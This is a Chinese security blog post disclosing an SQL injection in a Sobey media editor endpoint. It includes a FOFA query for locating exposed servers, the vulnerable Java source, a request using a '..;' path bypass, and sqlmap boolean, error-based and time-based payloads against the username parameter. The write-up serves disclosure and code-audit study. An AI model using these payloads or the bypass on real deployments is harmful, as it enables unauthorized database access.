---
title: "索贝融媒体 /sobey-mchEditor/mch/relacontentids/list SQL注入漏洞"
source: https://mrxn.net/jswz/sobey-relacontentids-list-sqli.html
asset_dir: assets/索贝融媒体-sobey-mcheditormchrelacontentidslist-sql注入漏洞
---

# 索贝融媒体 /sobey-mchEditor/mch/relacontentids/list SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/30 08:18
* 560浏览
* [0评论](#comment)
* 34分钟阅读

深入探索

数据库

sql

软件


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

索贝产品中的 /sobey-mchEditor/mch/relacontentids/list 接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可以通过构造恶意的SQL语句，获取数据库中的敏感信息，甚至可能导致数据库被完全控制。

SQL注入检测工具

# 影响版本

# fofa语法

> icon\_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"

# 漏洞分析

根据漏洞信息看下`mch/relacontentids/list`的实现逻辑

```
@RestController
@RequestMapping({"/mch/relacontentids"})
public class RelacontentidsController extends BaseController {
    private static final Logger logger = LoggerFactory.getLogger(RelacontentidsController.class);

    @RequestMapping(
        value = {"/list"},
        method = {RequestMethod.GET}
    )
    public Response list(@RequestParam("token") String token, @RequestParam("siteCode") String siteCode, @RequestParam(value = "startPublishDate",required = false) String startPublishDate, @RequestParam(value = "endPublishDate",required = false) String endPublishDate, @RequestParam(value = "username",defaultValue = "") String username, @RequestParam(value = "pageSize",required = false,defaultValue = "10") Integer pageSize, @RequestParam(value = "pageIndex",required = false,defaultValue = "0") Integer pageIndex) {
        List<Map<String, Object>> rows = new ArrayList();
        Map<String, Object> row = new HashMap();
        rows.add(row);
        StringBuffer sql = new StringBuffer("select a.title, relac.createUserName creator ,relac.createUserCode creatorCode,count(distinct relac.contentid) num ,relac.articleid from zcnrelacontentid  relac inner join zcnarticle a on a.id = relac.articleid ");
        if (StringUtils.isNotEmpty(username)) {
            try {
                sql.append(String.format(" and relac.createUserName  like '%%%s%%' ", URLDecoder.decode(username, "utf-8")));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
        }

        sql.append("where a.ifval = '1' ");
```

深入探索

物流软件安全

恶意软件分析工具

网络安全培训

代码一看就很明了了，**username**使用**String.format**格式化后被直接拼接在like语句中，从而造成了[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。如果没有`String.format`，就不存在，因为默认的`append`方法底层是**参数化查询**。

# 漏洞复现

> 权限绕过相关分析可以参考之前的 [索贝融媒体 getList SQL注入漏洞](https://mrxn.net/jswz/sobey-Articlelist-getList-sqli.html) 的权限校验部分
>
> 代码安全审计

```
GET /sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username='SQLI_POC HTTP/1.1
Host: sobey.mrxn.net
```

[![索贝融媒体 /sobey-mchEditor/mch/relacontentids/list SQL注入漏洞](images/img-001-8e0d3e1632bd.webp)](https://image.mrxn.net/61bafffe6ff24ddebfb6b18ec0e9fe32.webp)

成功利用报错注入在响应回显当前数据用户

漏洞修复方案

深入探索

Web安全书籍

服务器安全服务

VPN服务

[SQLMAP](https://mrxn.net/tag/sqlmap)结果如下

```
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username=' AND EXTRACTVALUE(3608,CASE WHEN (3608=3608) THEN 3608 ELSE 0x3A END) AND 'DAmH'='DAmH

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username=' AND GTID_SUBSET(CONCAT(0x716b787171,(SELECT (ELT(1709=1709,1))),0x71626a7671),1709) AND 'bckN'='bckN

    Type: time-based blind
    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
    Payload: http://sobey.mrxn.net/sobey-mchEditor/js/..;/mch/relacontentids/list?siteCode=&token=&userCode=admin&locale=zh&username=' AND 8319=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1) AND 'wrRE'='wrRE
---
```

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#sqlmap](https://mrxn.net/tag/sqlmap)
* [#Java](https://mrxn.net/tag/Java)
* [#0day](https://mrxn.net/tag/0day)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[索贝融媒体 /sobey-mchEditor/mch/relacontentids/list SQL注入漏洞](https://mrxn.net/jswz/sobey-relacontentids-list-sqli.html)  
文章链接：<https://mrxn.net/jswz/sobey-relacontentids-list-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

编程

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sobey-relacontentids-list-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

代码安全审计

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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